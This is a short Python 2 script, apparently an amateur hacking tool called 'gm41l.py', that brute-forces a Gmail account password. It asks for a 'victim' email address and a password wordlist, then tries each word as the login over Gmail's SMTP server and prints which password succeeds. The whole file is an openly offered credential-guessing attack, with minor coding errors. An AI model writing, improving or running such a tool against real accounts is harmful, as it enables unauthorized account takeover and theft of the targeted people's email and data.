#!/usr/bin/env python
# *-* coding: iso-8859-1 *-*
import smtplib

print """
 ________            _____ ____.__   
 /  _____/  _____    /  |  /_   |  |  
/   \  ___ /     \  /   |  ||   |  |  
\    \_\  \  Y Y  \/    ^   /   |  |__
 \______  /__|_|  /\____   ||___|____/
        \/      \/      |__|    Coded by Whoamii

[INFO]Put the passowrd list in same folder the gm41l.py is!
"""


username = raw_input("Enter your victim email addres: ")

words = raw_input("Enter your password list: ")

wordlist = open(words, 'r')

for i in wordlist.readlines():
    password = i.strip('/n')
    try:
       
       s = smtplib.SMTP('smtp.gmail.com', 587)
       s.ehlo()
       s.starttls()
       s.login(username, password)
       s.close
       print "[+]Password Found: " + password
    except:
       print "[-]Wrong Password: " + password


